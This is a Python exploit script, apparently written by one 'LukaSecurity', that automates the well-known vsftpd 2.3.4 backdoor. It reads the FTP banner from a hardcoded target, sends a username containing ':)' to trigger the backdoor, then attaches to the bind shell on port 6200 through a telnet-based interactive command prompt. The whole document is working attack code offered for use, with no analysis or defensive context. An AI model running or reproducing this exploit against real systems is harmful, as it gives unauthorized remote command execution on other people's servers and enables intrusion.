#!/usr/bin/python3
# -*- encoding: utf-8 -*-


"""
*******************************************************
* Script para automatizar explotacion de vsftpd 2.3.4 *
*				by LukaSecurity	      *
*******************************************************
"""


import socket
import sys
from telnetlib import Telnet



"""

	rhost -> host that has the FTP service
	rport -> port number on which the FTP service mails
	ftp_vulnerable -> Vulnerable FTP version to use

"""

rhost = '192.168.0.19'
rport = 21
ftp_vulnerable = "vsFTPd 2.3.4"



def banner():

        print("""

			   __ _                          _                            
			  / _| |                        | |                           
			 | |_| |_ _ __ ______ __ _ _   _| |_ ___  _ ____      ___ __  
			 |  _| __| '_ \______/ _` | | | | __/ _ \| '_ \ \ /\ / / '_ \ 
			 | | | |_| |_) |    | (_| | |_| | || (_) | |_) \ V  V /| | | |
			 |_|  \__| .__/      \__,_|\__,_|\__\___/| .__/ \_/\_/ |_| |_|
			         | |                             | |       FTP Exploit
			         |_|                             |_|        By LukasMp


""")



# Init de client Socket for connect and recive the reponse of ftp remote port for check vuln
def initClient():

	"""This function starts the socket client and gets the banner of the FTP service"""

	banner()

	global service_version

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

		try:
			s.connect((rhost, rport))

			socket_data = s.recv(1024).decode()
			service_version = socket_data.strip('0123456789').replace('(','').replace(')','').rstrip().lstrip()

			print(f'\n\t--- Data of Scan ---\n\n\t[*] IP -> {rhost}\n\t[*] Port -> {rport}\n\t[*] Service Version -> {service_version}')

		except socket.error as e:
			print(f'\n[!] Connection Error at {rhost}:{rport}')




def promptCommand(telnet_client):

	"""This function generates a prompt in the active session with telnet"""

	while True:

		print('reverse@shell$ ', end='', flush=True)
		command = input()

		if command == "":
			pass

		else:
			telnet_client.write(command.encode() + b'\n')
			response = telnet_client.read_until(b'\n')
			print(response.decode(), end='')




def exploitVuln(version):


	if ftp_vulnerable == version:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

			try:
				s.connect((rhost, rport))
				s.send(b'USER hackerr:)\n')
				s.send(b'PASS password\n')

				try:
					telnet_client = Telnet(rhost, 6200)
					print('\n\t[+] Port 6200 available. this apear vulnerable\n')
					promptCommand(telnet_client)

				except ConnectionRefusedError:
					print('\n[!] Port 6200 is not open')
					sys.exit()
				except EOFError as e:
					print("[!] Session closed")

			except socket.error as e:
				print(f'\n[!] Connection Error at {rhost}:6200')


if __name__ == '__main__':

	try:
		initClient()
		exploitVuln(service_version)

	except KeyboardInterrupt:
		print("")
		sys.exit()
